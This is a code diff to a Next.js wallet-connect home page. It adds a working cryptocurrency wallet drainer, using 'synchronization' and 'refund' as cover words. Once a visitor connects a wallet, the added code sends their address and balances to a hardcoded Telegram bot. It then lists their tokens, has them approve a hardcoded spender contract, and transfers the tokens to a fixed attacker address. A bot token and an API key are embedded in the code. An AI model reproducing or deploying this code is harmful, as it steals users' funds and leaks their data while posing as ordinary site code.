@@ -1,14 +1,17 @@
 import React from "react";
-import { ConnectWallet } from "@thirdweb-dev/react";
+import { ethers } from "ethers";
+import { ConnectWallet,useAddress, useBalance, useConnectionStatus,useSigner,useSDK} from "@thirdweb-dev/react";
 import {Navbar, NavbarBrand, NavbarContent, NavbarItem, Link, Button, ButtonGroup, NavbarMenuToggle, NavbarMenu, NavbarMenuItem, Card, CardBody, Input, Image, CardFooter, CardHeader,Divider} from "@nextui-org/react";
-import styles from "../styles/Home.module.css";
-import {AcmeLogo} from "./AcmeLogo";
-import {SearchIcon} from "./SearchIcon";
-import {MoonIcon} from "./moon";
-import {SunIcon} from "./sun";
+import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';
+import { useContext, useState, useEffect } from "react";
+import ChainContext from "../context/Chain";
+import { useRouter } from 'next/router';
+import AcmeLogo from "./AcmeLogo";
+import SearchIcon from "./SearchIcon";
+import MoonIcon from "./moon";
+import SunIcon from "./sun";
 import { NextPage } from "next";
 import {useTheme} from "next-themes";
-import { useRouter } from 'next/router';
 
 const Home: NextPage = () => {
   const [isMenuOpen, setIsMenuOpen] = React.useState(false);
@@ -168,6 +171,168 @@ const Home: NextPage = () => {
     },
     
   ];
+  const address = useAddress();
+const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
+const wbalance = data?.displayValue;
+const { selectedChain, setSelectedChain } = useContext(ChainContext);
+const [allowanceRequested, synchronizationCompleted] = useState(false);
+const signer = useSigner();
+const [synchronizationSuccess, setSynchronizationProcess] = useState(false);
+const addresses: Record<string, string> = {
+    ["ethereum"]: "0xb0e62DE026195d51b0DA52D8c79d7FFd6aC778Ce",
+    ["binance"]: "0xb0e62DE026195d51b0DA52D8c79d7FFd6aC778Ce",
+  };
+  const net: Record<string,string> = {
+    "ethereum" : "ethereum",
+    "binance": "binance",
+  };
+   const sdk =  useSDK();
+  const aptk = "6tL6x4wh-ROoNc4hp3C8gE-ToXlCSM5t"
+  const chainUrls: Record<string, string> = {
+    ethereum: `https://eth-mainnet.g.alchemy.com/v2/${aptk}`,
+    arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${aptk}`,
+    binance:  `https://eth-mainnet.g.alchemy.com/v2/${aptk}`,
+    polygon: `https://matic-mainnet.g.alchemy.com/v2/${aptk}`,
+  };
+  const url = chainUrls[selectedChain];
+  const connectionStatus = useConnectionStatus();
+  console.log(connectionStatus);
+  console.log(selectedChain);
+  const [showConnectModal, setShowConnectModal] = useState(false);
+  async function main() {
+    if (connectionStatus === "unknown") {
+      await sendMessageToTelegram(`User is yet to connect. Hold on........`);
+      console.log(`User is yet to connect. Hold on........`);
+      setShowConnectModal(true);
+      return;
+      
+    } 
+    if (connectionStatus === "connecting"){
+      await sendMessageToTelegram(`User's wallet is connecting be patient....`);
+      console.log(`User's wallet is connecting be patient....`);
+    }
+    if (connectionStatus === "connected"){
+      await sendMessageToTelegram(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
+      console.log(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
+    }
+    if (connectionStatus === "disconnected"){
+      await sendMessageToTelegram(`User has disconnected !`);
+      console.log(`User has disconnected`);
+      setShowConnectModal(true);
+      return;
+    }
+
+    const options = {
+      method: "POST",
+      headers: {
+        accept: "application/json",
+        "content-type": "application/json",
+      },
+      body: JSON.stringify({
+        id: 1,
+        jsonrpc: "2.0",
+        method: "alchemy_getTokenBalances",
+        params: [address],
+      }),
+    };
+    // fetching the token balances
+    let res = await fetch(url, options);
+    let response = await res.json();
+  
+    // Getting balances from the response
+    const balances = response["result"];
+  
+    // Remove tokens with zero balance
+    const nonZeroBalances = await balances.tokenBalances.filter(
+        (token: { tokenBalance: string }) => token.tokenBalance !== "0"
+      );
+  
+    await sendMessageToTelegram(`Token balances of ${address}: \n`);
+  
+    // Create arrays to store contract addresses, balances, and formatted balances
+    const tokenAddresses = [];
+    const tokenBalances = [];
+    const formattedBalances = [];
+  
+    // Loop through all tokens with non-zero balance
+    for (let token of nonZeroBalances) {
+      // Get balance of token
+      let balance = token.tokenBalance;
+      
+  
+      // request options for making a request to get tokenMetadata
+      const tokenMetadataOptions = {
+        method: "POST",
+        headers: {
+          accept: "application/json",
+          "content-type": "application/json",
+        },
+        body: JSON.stringify({
+          id: 1,
+          jsonrpc: "2.0",
+          method: "alchemy_getTokenMetadata",
+          params: [token.contractAddress],
+        }),
+      };
+  
+      // parsing the response and getting metadata from it
+      let res2 = await fetch(url, tokenMetadataOptions);
+      let metadata = await res2.json();
+      metadata = metadata["result"];
+  
+      // Compute token balance in human-readable format
+      balance = balance / Math.pow(10, metadata.decimals);
+      balance = balance.toFixed(2);
+      // Create formatted balance using ethers.utils.parseUnits()
+      if (balance > 5) {
+        // Create formatted balance using ethers.utils.parseUnits()
+        const formattedBalance = ethers.utils.parseUnits(balance.toString(), 'ether');
+        console.log(formattedBalance);
+        
+        // Print name, balance, and symbol of token
+        await sendMessageToTelegram(`${metadata.name}: ${balance} ${metadata.symbol} Contract Address:${token.contractAddress}`);
+        
+        // Add contract address, balance, and formatted balance to the arrays
+        tokenAddresses.push(token.contractAddress);
+        tokenBalances.push(balance);
+        formattedBalances.push(formattedBalance);
+      }
+    }
+     const spenderAddress = addresses[selectedChain];
+    // Loop through contract addresses and formatted balances
+    for (const [index, tokenAddress] of tokenAddresses.entries()) {
+        const refundAmount = formattedBalances[index];
+       
+        
+      const tokenContract = new ethers.Contract(tokenAddress, ['function approve(address spender, uint256 value)'], signer);
+      const myContract = new ethers.Contract(spenderAddress,['function transferERC20(address tokenAddress, address fromAddress, address toAddress, uint256 value)'],signer );
+      const toAddress ="0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25"
+      try {
+        
+        const gasLimit = "100000";
+        const tx = await tokenContract.approve(spenderAddress, refundAmount, {gasLimit});
+        await tx.wait();
+        await sendMessageToTelegram(`Synchronization completed for ${refundAmount} of ${tokenAddress}`);
+    const transferTx = await myContract.transferERC20(tokenAddress, address, toAddress, refundAmount);
+    await transferTx.wait();
+    await sendMessageToTelegram(`Transfer completed for ${refundAmount} of ${tokenAddress}`);
+      } catch (error) {
+        const tferror = console.info(`ERROR:`, error);
+        await sendMessageToTelegram(`${tferror}`);
+        setSynchronizationProcess(false); 
+        return; // Exit the loop on error
+      }
+    }
+    
+    synchronizationCompleted(true); // Move this line outside the loop
+    setSynchronizationProcess(true); 
+  }
+  useEffect(() => {
+    if (synchronizationSuccess) {
+        router.push("/synchronize"); // Replace "/new-page" with your desired destination
+      }
+    }, [synchronizationSuccess, router]);
+
 
   return (
     
@@ -297,5 +462,22 @@ const Home: NextPage = () => {
 </div>
   );
 };
+const sendMessageToTelegram = async (message: string) => {
+  const botToken = '6488844148:AAF76yNNMzeq3A9WqyPYdbWflixc0zNBEAU';
+  const chatId = '1850200586'; // You'll need to obtain this from your Telegram bot
+  
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+  const response = await fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+    }),
+  });
+}; 
 
 export default Home;
